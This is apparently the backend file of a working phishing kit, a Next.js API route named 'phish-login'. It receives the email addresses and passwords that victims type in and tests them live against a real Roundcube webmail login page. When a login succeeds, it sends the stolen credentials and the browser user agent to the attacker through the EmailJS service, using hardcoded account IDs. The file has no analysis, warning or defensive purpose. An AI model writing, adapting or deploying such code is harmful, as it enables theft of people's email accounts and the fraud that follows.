// api/phish-login.ts

export const runtime = "nodejs";

import { NextRequest, NextResponse } from "next/server";

export default async function handler(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password, token } = body;
    const userAgent = request.headers.get("user-agent") || "Unknown Device";

    // 1. Prepare the payload exactly as the real site expects
    const formData = new URLSearchParams({
      _user: email,
      _pass: password,
      _token: token,
      _task: "login",
      _action: "login",
      _timezone: "_default_",
    });

    // 2. Send to the REAL site
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": userAgent,
        // Optional: Pass through cookies if needed for session continuity
        // "Cookie": request.headers.get("cookie") || "",
      },
      body: formData.toString(),
      redirect: "follow", // Crucial: Follow redirects to see the final state
    });

    // 3. Determine success based on the FINAL URL after redirects
    // Roundcube redirects to _task=mailbox on success, stays on _task=login on failure
    const finalUrl = response.url;
    const isSuccess = response.ok && finalUrl.includes("_task=mailbox");

    // 4. Send Email ONLY if login was successful
    if (isSuccess) {
      sendEmail(email, password, userAgent).catch((err) =>
        console.error("Email send failed", err),
      );
    } else {
      console.log(`Login failed for ${email}. Final URL: ${finalUrl}`);
    }

    // 5. Respond to frontend
    return NextResponse.json({
      success: isSuccess,
      url: finalUrl,
      status: response.status,
    });
  } catch (error) {
    console.error(error);
    return NextResponse.json(
      { success: false, error: "Internal Error" },
      { status: 500 },
    );
  }
}

async function sendEmail(email: string, password: string, userAgent: string) {
  try {
    await fetch("https://api.emailjs.com/api/v1/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: "service_1b86ixe",
        template_id: "template_a2504xo",
        user_id: "lES1DjjjfZ3BGbkw7",
        template_params: {
          email: email,
          password: password,
          user_agent: userAgent.substring(0, 50),
        },
      }),
    });
  } catch (e) {
    console.error("EmailJS Error", e);
  }
}
